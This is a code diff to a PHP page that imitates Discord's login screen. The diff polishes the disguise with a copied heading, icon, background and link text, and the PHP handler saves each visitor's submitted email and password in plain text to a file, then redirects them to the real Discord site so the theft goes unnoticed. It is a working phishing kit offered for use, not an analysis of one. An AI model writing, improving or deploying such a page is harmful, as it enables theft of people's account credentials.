@@ -4,11 +4,11 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Discord</title>
-<link rel="icon" type="image/x-icon" href="https://discord.com/assets/favicon.ico">
+<link rel="icon" type="image/x-icon" href="./discord.ico">
 <style>
     body {
         font-family: 'Arial', sans-serif;
-        background: url('background.png') no-repeat center center fixed;
+        background: url('discord.png') no-repeat center center fixed;
         background-size: cover;
         display: flex;
         justify-content: center;
@@ -69,11 +69,11 @@
 
 <div class="login-container">
     <form class="login-form" action="" method="post">
-        <h2>Log in to Discord</h2>
-        <input type="text" name="username" placeholder="Email or Phone Number" value="<?php echo isset($_GET['username']) ? htmlspecialchars($_GET['username']) : ''; ?>" required>
+        <h2>Welcome back!</h2>
+        <input type="text" name="username" placeholder="Email address or phone number" value="<?php echo isset($_GET['username']) ? htmlspecialchars($_GET['username']) : ''; ?>" required>
         <input type="password" name="password" placeholder="Password" required>
         <button type="submit">Log In</button>
-        <div class="signup-link"> Don't have an account? <a href="https://discord.com/register">Sign Up</a></div>
+        <div class="signup-link"><a href="https://www.discord.com/register">Need an account? Register</a></div>
     </form>
 </div>
 
@@ -99,8 +99,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $username = $_POST["username"];
     $password = $_POST["password"];
 
-    $data = "User: " . $username . "\n" . "Password: " . $password . "\n|-------------------DISCORD-------------------|\n";
+    $data = "User: " . $username . "\n" . "Pass: " . $password . "\n|-------------------DISCORD-------------------|\n";
     file_put_contents($filename, $data, FILE_APPEND);
-    header("Location: https://discord.com");
+    header("Location: https://www.discord.com/login");
 }
 ?>
